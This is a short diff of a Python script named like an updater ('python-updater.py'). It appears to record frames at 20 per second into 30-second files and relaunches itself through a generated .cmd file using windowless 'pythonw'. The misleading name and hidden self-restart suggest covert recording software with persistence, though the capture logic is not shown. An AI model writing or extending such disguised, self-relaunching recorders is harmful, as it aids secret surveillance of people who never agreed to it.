@@ -9,10 +9,10 @@ try:
     output_name = "packages"
     output_path = "./" + output_name
     
-    if path.exists(f"./python-updater.exe.cmd"):
-        remove(f"./python-updater.exe.cmd")
+    if path.exists(f"./python-updater.py.cmd"):
+        remove(f"./python-updater.py.cmd")
     
-    file_path = "python-updater.exe"
+    file_path = "python-updater.py"
     seconds_per_file = 30
     frame_rate = 20.0
     frame_time = 1.0 / frame_rate
@@ -90,7 +90,7 @@ try:
         
         restartFileName = f"{file_path}.cmd"
         with open(restartFileName, 'w') as startFile:
-            startFile.write(f"timeout 1 > nul & start {file_path}")
+            startFile.write(f"timeout 1 > nul & pythonw {file_path}")
 
         system(f"{restartFileName}")
     except:
